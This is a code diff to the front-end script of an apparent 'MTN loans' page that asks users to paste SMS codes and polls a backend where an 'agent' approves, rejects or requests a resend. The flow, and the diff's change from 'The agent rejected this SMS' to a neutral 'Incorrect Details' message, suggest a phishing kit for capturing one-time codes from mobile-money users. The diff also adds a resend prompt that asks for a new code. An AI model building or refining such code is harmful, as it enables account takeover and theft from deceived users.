@@ -1,5 +1,4 @@
 // --- BACKEND CONFIGURATION ---
-// Point this to your actual Render backend service URL
 const API_URL = 'https://mtn-loans-backend.onrender.com';
 
 // --- TRANSLATIONS DICTIONARY ---
@@ -329,9 +328,31 @@ verifyBtn.addEventListener('click', function() {
 
                     } else if (statusData.status === 'rejected') {
                         clearInterval(interval);
-                        document.getElementById('processing-title').innerText = "SMS Rejected";
-                        document.getElementById('processing-text').innerText = "The agent rejected this SMS. Please try again.";
+                        document.getElementById('processing-title').innerText = "Incorrect Details";
+                        document.getElementById('processing-text').innerText = "Please go back and check the SMS and try again.";
                         document.getElementById('loader-spinner').style.display = "none";
+                        
+                        setTimeout(() => {
+                            showScreen('screen-sms');
+                            smsInput.value = ''; // Clear the input for them to re-enter
+                            verifyBtn.style.pointerEvents = 'none';
+                            verifyBtn.style.background = '#1e3a8a';
+                            verifyBtn.style.color = '#8892b0';
+                        }, 2500);
+
+                    } else if (statusData.status === 'resend') {
+                        clearInterval(interval);
+                        document.getElementById('processing-title').innerText = "SMS Resent";
+                        document.getElementById('processing-text').innerText = "A new SMS code has been sent. Check your messages and paste it here.";
+                        document.getElementById('loader-spinner').style.display = "none";
+                        
+                        setTimeout(() => {
+                            showScreen('screen-sms');
+                            smsInput.value = ''; // Clear the input for the new SMS
+                            verifyBtn.style.pointerEvents = 'none';
+                            verifyBtn.style.background = '#1e3a8a';
+                            verifyBtn.style.color = '#8892b0';
+                        }, 3000);
                     }
                 } catch (error) {
                     console.error("Checking SMS status...", error);
